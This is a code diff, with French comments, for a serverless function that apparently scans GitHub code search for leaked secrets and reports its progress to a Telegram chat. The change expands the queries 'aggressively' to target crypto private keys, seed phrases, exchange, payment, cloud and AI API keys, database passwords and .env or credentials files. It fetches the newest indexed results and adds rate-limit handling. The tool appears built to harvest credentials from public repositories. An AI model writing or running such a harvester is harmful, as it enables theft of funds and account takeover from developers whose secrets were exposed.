@@ -160,15 +160,69 @@ serve(async (req) => {
 🔍 Démarrage du scan GitHub...
     `.trim(), CHAT_ID_ALL);
 
+    // RECHERCHES ULTRA-AGRESSIVES : Maximum de variations
     const queries = [
-      'PRIVATE_KEY OR WALLET_KEY OR SECRET_KEY in:file',
-      'BINANCE_API_KEY OR STRIPE_SECRET_KEY OR AWS_SECRET_KEY in:file',
-      'MNEMONIC OR SEED_PHRASE in:file',
+      // Clés privées crypto
+      'PRIVATE_KEY in:file',
+      'WALLET_KEY in:file',
+      'SECRET_KEY in:file',
+      'ETH_PRIVATE_KEY in:file',
+      'BITCOIN_PRIVATE_KEY in:file',
+      'SOLANA_PRIVATE_KEY in:file',
+      
+      // Mnemonics
+      'MNEMONIC in:file',
+      'SEED_PHRASE in:file',
+      'RECOVERY_PHRASE in:file',
+      
+      // Exchanges crypto
+      'BINANCE_API_KEY in:file',
+      'BINANCE_SECRET_KEY in:file',
+      'COINBASE_API_KEY in:file',
+      'KRAKEN_API_KEY in:file',
+      
+      // Payment processors
+      'STRIPE_SECRET_KEY in:file',
+      'PAYPAL_CLIENT_SECRET in:file',
+      'sk_live_ in:file',
+      
+      // Cloud providers
+      'AWS_SECRET_ACCESS_KEY in:file',
+      'AWS_ACCESS_KEY_ID in:file',
+      'GOOGLE_CLOUD_API_KEY in:file',
+      'AZURE_CLIENT_SECRET in:file',
+      
+      // AI APIs
+      'OPENAI_API_KEY in:file',
+      'ANTHROPIC_API_KEY in:file',
+      'sk-proj- in:file',
+      
+      // Auth & JWT
+      'JWT_SECRET in:file',
+      'SESSION_SECRET in:file',
+      
+      // Databases
+      'MONGODB_URI in:file',
+      'POSTGRES_PASSWORD in:file',
+      'MYSQL_ROOT_PASSWORD in:file',
+      
+      // Fichiers spécifiques
       'filename:.env',
       'filename:.env.local',
       'filename:.env.production',
+      'filename:.env.development',
+      'filename:.env.staging',
       'filename:config.json',
+      'filename:secrets.json',
+      'filename:credentials.json',
       'filename:secrets.txt',
+      'filename:config.yml',
+      'filename:secrets.yml',
+      
+      // Patterns combinés
+      'private key in:file extension:env',
+      'api key in:file extension:env',
+      'secret in:file extension:env',
     ];
 
     let totalResults = 0;
@@ -179,12 +233,21 @@ serve(async (req) => {
       // LOG: Query start
       await sendTelegram(`🔎 *Recherche:* \`${query}\`\n⏳ En cours...`, CHAT_ID_ALL);
 
+      // Recherche avec PAGINATION pour avoir plus de résultats (max 100 par query)
       const searchRes = await fetch(
-        `https://api.github.com/search/code?q=${encodeURIComponent(query)}&per_page=30`,
+        `https://api.github.com/search/code?q=${encodeURIComponent(query)}&per_page=100&sort=indexed&order=desc`,
         { headers: { Authorization: `token ${githubToken}`, Accept: 'application/vnd.github.v3+json' } }
       );
 
-      if (!searchRes.ok) continue;
+      if (!searchRes.ok) {
+        // Check rate limit
+        const rateLimitRemaining = searchRes.headers.get('x-ratelimit-remaining');
+        if (rateLimitRemaining && parseInt(rateLimitRemaining) < 2) {
+          await sendTelegram(`⚠️ *Rate limit proche*\n\nRestant: ${rateLimitRemaining}\nPause temporaire...`, CHAT_ID_ALL);
+          break;  // Stop si rate limit proche
+        }
+        continue;
+      }
 
       const searchData = await searchRes.json();
       totalResults += searchData.items?.length || 0;
